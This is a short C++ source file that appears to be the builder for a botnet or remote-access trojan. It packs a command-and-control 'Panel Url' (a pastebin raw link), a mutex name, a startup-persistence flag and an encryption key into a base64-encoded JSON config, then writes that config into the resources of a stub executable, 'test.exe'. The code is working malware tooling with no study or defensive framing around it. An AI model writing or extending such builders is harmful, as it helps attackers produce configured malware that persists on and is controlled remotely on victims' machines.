
#include "stdafx.h"
#include <iostream>
#include <string>
#include <time.h>
#include <Windows.h>

#include "json.hpp"
#include "rc4.h"
#include "base64.h"

using json = nlohmann::json;

std::string key(size_t length, size_t seed)
{
	srand(seed);
	auto randchar = []() -> char
	{
		const char charset[] =
			"0123456789"
			"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
			"abcdefghijklmnopqrstuvwxyz";
		const size_t max_index = (sizeof(charset) - 1);
		return charset[rand() % max_index];
	};
	std::string str(length, 0);
	std::generate_n(str.begin(), length, randchar);
	return str;
}

void WriteToResources(LPCSTR szTargetPE, int id, LPBYTE lpBytes, DWORD dwSize)
{
	HANDLE hResource = NULL;
	hResource = BeginUpdateResourceA(szTargetPE, FALSE);
	UpdateResource(hResource, RT_RCDATA, MAKEINTRESOURCE(id), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPVOID)lpBytes, dwSize);
	EndUpdateResource(hResource, FALSE);
}


int main(int argc, char* argv[])
{
	RC4 rc4;

	std::string ek, pu, gp, bn;

	/*
	std::cout << "Panel Url (EG: 'test.com') -> "; std::cin >> pu;
	std::cout << "Mutex -> "; std::cin >> gp;
	//bn = "true";
	//bn = "false";
	std::cout << "Startup true/false -> "; std::cin >> bn;
	std::cout << "Encryption Key -> "; std::cin >> ek;

	*/

	pu = "http://pastebin.com/raw/mTLXBksj";
	gp = "mutex";
	bn = "false";
	ek = "KQC";
	/*
	pu = argv[1];
	gp = argv[2];
	bn = argv[3];
	ek = argv[4];
	*/


	json config = {
		{ "ek", ek},
		{ "pu", pu},
		{ "mux", gp},
		{ "sup", bn},
		{ "ri", 5},
		{ "pn", {"FOO", "BAR"}}
	};
	std::string write = config.dump();
	std::cout << write << std::endl;
	//write = rc4.doRC4(write, key(32, 0x4d930cf57cfda1ba));
	write = absent::crypto::b64::encode(write.c_str());

	char* c_write = &write[0u];
	std::cout << write << std::endl;
	WriteToResources("test.exe", 10, (BYTE *)c_write, strlen(c_write));
    return 0;
}

